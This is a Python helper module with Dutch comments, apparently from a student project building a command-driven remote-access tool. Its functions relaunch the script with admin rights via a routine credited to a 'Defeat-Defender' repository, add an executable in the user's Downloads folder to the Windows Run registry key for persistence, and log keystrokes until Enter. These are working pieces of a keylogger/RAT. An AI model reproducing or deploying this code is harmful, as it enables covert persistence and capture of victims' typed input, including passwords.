# Dit zijn de kleinste functies
# Binnen deze functie roep ik geen functies aan die ik zelf geschreven heb
import os, sys, ctypes, winreg


def make_banner() -> str:
    """
    ASCII art opgeslagen als string.
    """
    return r"""
               _.-*'""'*-._
            .-"            "-.
          ,"                  ",
        .'      _.-.--.-._      ',
       /     .-'.-"    "-.'-.     \
      /     /  /"'-.  .-'"\  \     \
     :     :  :     ;:     ;  ;     ;
     ;     :  ; *   !! *   :  ;     :
     ;      ; :   .'  '.   ; :      :
     :       \ \-'      '-/ /       ;
      \       '.'-_    _-'.'       /
       \        '*-"-+"-*'        /
        '.          /|          .'
          *,       / |        ,*
          / '-_            _-'  \
         /     "*-.____.-*"      \
        /            |            \
       :    :        |        ;    ;
       |.--.;        |        :.--.|
       (   ()        |        ()   )
        '--^_        |        _^--'
           | "'*--.._I_..--*'" |
           | __..._  | _..._   |
          .'"      `"'"     ''"'.
Ik ben Ready, gebruik /help om alle commands te zien
===========================================
Viresh & Muazma
===========================================
"""

def save_media_to(filename_prefix, extension) -> str:
    """
    Maakt de map aan (als die nog niet bestaat), en slaat een file daarin op.
    - filename_prefix (str): naam van de bestand
    - extension (str): file type
    - Returns een string van de volledige path naar het bestand
    """
    os.makedirs("./media", exist_ok=True)
    filename = f"{filename_prefix}.{extension}"
    return os.path.join("./media", filename)

def get_adminRights():
    """
    - Maak een terminal open met admin rechten
    - en sluit de oude terminal (de terminal zonder admin rechten)
    """
    # Source: https://github.com/witchfindertr/Defeat-Defender-Python-Version-/blob/c2a43b4b2f570b87259ca368a98d2e3ab3572dff/Defeat-Defender.py#L11-L15
    if sys.argv[-1] != "asadmin":
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:] + ['asadmin'])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        sys.exit(0)

def add_to_registry(program_name):
    """
    Voegt een programma toe aan de Windows-opstartitems via het register.
    programmas die hier staan starten op als je laptop aan gaat

    program_name: is de naam die in het register toegevoegd wordt, dit mag je zelf bepalen
    """
    # Code uit week 2 opdracht
    try:
        # Bepaal de registersleutel voor de huidige gebruiker
        registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")

        # Voeg een nieuwe registerwaarde toe
        winreg.SetValueEx(registry_key, program_name, 0, winreg.REG_SZ, rf"C:\Users\{os.getlogin()}\Downloads\main.exe")

        print(f"{program_name} is toegevoegd aan de opstart-items")

        # Sluit de registersleutel
        winreg.CloseKey(registry_key)

    except Exception as e:
        print(f"Fout bij toevoegen aan het register: {e}")

inputList = []
def log_a_string(key):
    """
    functie die binnen get_loggedKeys() aangeroepen wordt.
    - maakt een list van alle keys die geklikt zijn.
    - stopt als enter geklikt wordt.
    - delete alle 'key.shift' uit de list.
    """
    global inputList

    try:
        # de logger stoppen als enter geklikt wordt
        if key == key.enter:
            # delete Key.shift uit de list, als het voorkomt in de list
            while 'Key.shift' in inputList:
                inputList.remove('Key.shift')
            return False
        
        # spatie toevoegen als het gebruikt wordt
        elif key == key.space:
            inputList.append(" ")

        # als backspace geklikt wordt, en er staat iets in de list
        elif key == key.backspace and len(inputList) > 0:
            # haal dan de laatste item uit de list
            inputList.pop(-1)
        
        # voor letters en cijfers
        else:
            inputList.append(format(key.char))

    # als het tekens zijn
    except AttributeError:
        inputList.append(format(key))

# maak een list met 2 items
def command_list(input_list):
    """
    - check als '-admin' als argument is meegegeven
      - plaats die in een list (list[0])
    - maak een string van de overige argumenten
      - sla die op in dezelfde list (list[1])
    """
    new_list = []

    # Check of -admin in de lijst zit
    if '-admin' in input_list:
        # voeg admin toe aan een nieuwe lijst
        new_list.append('-admin')
        # Maak een string van alles behalve -admin
        command = " ".join([item for item in input_list if item != '-admin'])
        new_list.append(command)
    else:
        # als er geen -admin is, alles samenvoegen
        command = " ".join(input_list)
        new_list.append(command)

    return new_list
